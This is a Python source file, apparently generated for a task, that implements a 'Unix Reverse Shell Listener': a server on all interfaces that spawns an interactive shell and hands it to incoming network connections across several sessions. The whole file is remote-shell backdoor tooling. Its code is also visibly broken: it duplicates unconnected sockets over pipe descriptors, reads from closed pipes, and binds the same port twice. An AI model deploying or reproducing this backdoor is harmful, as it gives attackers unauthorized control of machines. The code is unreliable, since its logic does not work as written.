"""Unix Reverse Shell Listener implementation.

Implements a TCP server that accepts client connections, spawns a shell process,
and multiplexes stdin/stdout/stderr between the socket connection and the child process.
"""
from TASK_001_models import ExecutionResult, ReverseShellConfig

import os
import select
import socket
import subprocess
import sys
from typing import Optional



class UnixReverseShell:
    """Manages a single reverse shell session with multiplexed I/O."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.client_socket: Optional[socket.socket] = None
        self.child_process: Optional[subprocess.Popen] = None
        self.stdin_pipe: Optional[socket.socket] = None
        self.stdout_pipe: Optional[socket.socket] = None
        self.stderr_pipe: Optional[socket.socket] = None
        self.running = False

    def start(self) -> ExecutionResult:
        """Start the reverse shell session.
        
        Returns:
            ExecutionResult with status of the operation.
        """
        try:
            # Create a TCP server socket listening on 0.0.0.0:5522
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.client_socket.bind(('0.0.0.0', self.config.port))
            self.client_socket.listen(5)
            self.client_socket.setblocking(False)

            # Spawn the shell process with piped I/O
            self.child_process = subprocess.Popen(
                [self.config.shell_type, '-i'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                close_fds=True
            )

            # Create pipes to communicate with the child process
            self.stdin_pipe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.stdout_pipe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.stderr_pipe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            self.stdin_pipe.setblocking(False)
            self.stdout_pipe.setblocking(False)
            self.stderr_pipe.setblocking(False)

            # Connect stdin/stdout of child process to our pipes
            os.dup2(self.stdin_pipe.fileno(), self.child_process.stdin.fileno())
            os.dup2(self.stdout_pipe.fileno(), self.child_process.stdout.fileno())
            os.dup2(self.stderr_pipe.fileno(), self.child_process.stderr.fileno())

            # Close the original file descriptors in the child process
            self.child_process.stdin.close()
            self.child_process.stdout.close()
            self.child_process.stderr.close()

            self.running = True
            return ExecutionResult(
                command_output=f"Reverse shell started on 0.0.0.0:{self.config.port}",
                exit_code=0,
                error_messages=[]
            )

        except Exception as e:
            self.running = False
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)]
            )

    def run(self) -> ExecutionResult:
        """Run the multiplexed event loop.
        
        Returns:
            ExecutionResult with accumulated output and status.
        """
        if not self.running or not self.child_process:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=["Process not running"]
            )

        # Collect all file descriptors for select
        fd_list = [self.client_socket]
        if self.stdin_pipe and self.stdin_pipe.fileno() != 0:
            fd_list.append(self.stdin_pipe)
        if self.stdout_pipe and self.stdout_pipe.fileno() != 1:
            fd_list.append(self.stdout_pipe)
        if self.stderr_pipe and self.stderr_pipe.fileno() != 2:
            fd_list.append(self.stderr_pipe)

        # Add child process stdin/stdout to the select list
        if self.child_process.stdin and self.child_process.stdin.fileno() >= 0:
            fd_list.append(self.child_process.stdin)
        if self.child_process.stdout and self.child_process.stdout.fileno() >= 0:
            fd_list.append(self.child_process.stdout)

        # Add stderr pipe if it exists separately
        if self.stderr_pipe and self.stderr_pipe.fileno() >= 0:
            fd_list.append(self.stderr_pipe)

        try:
            while self.running and self.child_process.poll() is None:
                readable, writable, exceptional = select.select(
                    [fd for fd in fd_list if not fd.closed],
                    [],
                    []
                )

                for fd in readable:
                    if fd == self.client_socket:
                        # Accept new connection
                        try:
                            conn, addr = self.client_socket.accept()
                            conn.setblocking(False)
                            self._handle_connection(conn)
                        except BlockingIOError:
                            pass
                        except OSError as e:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=[f"Accept error: {e}"]
                            )

                    elif fd == self.stdin_pipe and not self.stdin_pipe.closed:
                        try:
                            data = self.stdin_pipe.recv(4096)
                            if data:
                                # Write to child process stdin
                                os.write(self.child_process.stdin.fileno(), data)
                        except BlockingIOError:
                            pass
                        except OSError as e:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=[f"Read error: {e}"]
                            )

                    elif fd == self.stdout_pipe and not self.stdout_pipe.closed:
                        try:
                            data = os.read(self.child_process.stdout.fileno(), 4096)
                            if data:
                                # Write to client socket stdout
                                self.stdout_pipe.sendall(data)
                        except BlockingIOError:
                            pass
                        except OSError as e:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=[f"Write error: {e}"]
                            )

                    elif fd == self.stderr_pipe and not self.stderr_pipe.closed:
                        try:
                            data = os.read(self.child_process.stderr.fileno(), 4096)
                            if data:
                                # Write to client socket stderr
                                self.stderr_pipe.sendall(data)
                        except BlockingIOError:
                            pass
                        except OSError as e:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=[f"Stderr read error: {e}"]
                            )

                # Check if child process has exited
                if self.child_process.poll() is not None:
                    result = self.child_process.wait()
                    return ExecutionResult(
                        command_output=f"Process exited with code {result}",
                        exit_code=result,
                        error_messages=[]
                    )

        except KeyboardInterrupt:
            self.stop()
            return ExecutionResult(
                command_output="Stopped by user",
                exit_code=0,
                error_messages=[]
            )
        except Exception as e:
            self.running = False
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)]
            )

    def _handle_connection(self, conn: socket.socket) -> None:
        """Handle an incoming client connection."""
        try:
            # Set up bidirectional communication with the child process
            os.dup2(conn.fileno(), self.child_process.stdin.fileno())
            os.dup2(conn.fileno(), self.child_process.stdout.fileno())

            conn.setblocking(False)
            self.client_socket = conn
            self.running = True
        except OSError as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[f"Connection setup error: {e}"]
            )

    def stop(self) -> ExecutionResult:
        """Stop the reverse shell session."""
        self.running = False
        if self.child_process and self.child_process.poll() is None:
            self.child_process.terminate()
            try:
                self.child_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.child_process.kill()
                self.child_process.wait()

        return ExecutionResult(
            command_output="Reverse shell stopped",
            exit_code=0,
            error_messages=[]
        )


class UnixReverseShellListener:
    """Main listener that manages multiple reverse shell sessions."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.sessions: dict[int, UnixReverseShell] = {}
        self._server_socket: Optional[socket.socket] = None
        self.running = False

    def start(self) -> ExecutionResult:
        """Start listening for connections."""
        try:
            # Create the server socket
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(('0.0.0.0', self.config.port))
            self._server_socket.listen(5)
            self._server_socket.setblocking(False)

            # Start the first session
            shell = UnixReverseShell(self.config)
            result = shell.start()
            if result.exit_code == 0:
                self.sessions[shell.client_socket.fileno()] = shell
                self.running = True
                return ExecutionResult(
                    command_output=f"Listener started on 0.0.0.0:{self.config.port}",
                    exit_code=0,
                    error_messages=[]
                )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[f"Start error: {e}"]
            )

    def run(self) -> ExecutionResult:
        """Run the listener event loop.
        
        Returns:
            ExecutionResult with accumulated output and status.
        """
        if not self.running or not self._server_socket:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=["Listener not running"]
            )

        try:
            while True:
                # Select on server socket and all active session sockets
                fd_list = [self._server_socket]
                for shell in self.sessions.values():
                    if shell.client_socket and not shell.client_socket.closed:
                        fd_list.append(shell.client_socket)

                readable, writable, exceptional = select.select(
                    [fd for fd in fd_list if not fd.closed],
                    [],
                    []
                )

                for fd in readable:
                    if fd == self._server_socket:
                        try:
                            conn, addr = self._server_socket.accept()
                            conn.setblocking(False)
                            shell = UnixReverseShell(self.config)
                            result = shell.start()
                            if result.exit_code == 0:
                                self.sessions[conn.fileno()] = shell
                                output = f"New connection from {addr}\n"
                                return ExecutionResult(
                                    command_output=output,
                                    exit_code=0,
                                    error_messages=[]
                                )
                        except BlockingIOError:
                            pass
                        except OSError as e:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=[f"Accept error: {e}"]
                            )

                    elif fd in self.sessions and not self.sessions[fd].client_socket.closed:
                        shell = self.sessions[fd]
                        result = shell.run()
                        if result.exit_code != 0:
                            return ExecutionResult(
                                command_output="",
                                exit_code=-1,
                                error_messages=result.error_messages
                            )

                # Check for closed sockets and clean up sessions
                for fd in list(self.sessions.keys()):
                    if self.sessions[fd].client_socket is None or \
                       (self.sessions[fd].client_socket and self.sessions[fd].client_socket.closed):
                        del self.sessions[fd]

        except KeyboardInterrupt:
            self.stop()
            return ExecutionResult(
                command_output="Stopped by user",
                exit_code=0,
                error_messages=[]
            )
        except Exception as e:
            self.running = False
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)]
            )

    def stop(self) -> ExecutionResult:
        """Stop the listener and all sessions."""
        self.running = False
        for shell in list(self.sessions.values()):
            result = shell.stop()
            if result.exit_code == 0:
                del self.sessions[shell.client_socket.fileno()]

        return ExecutionResult(
            command_output="Listener stopped",
            exit_code=0,
            error_messages=[]
        )


# Export the main classes for use by other modules
UnixReverseShell = UnixReverseShell
UnixReverseShellListener = UnixReverseShellListener
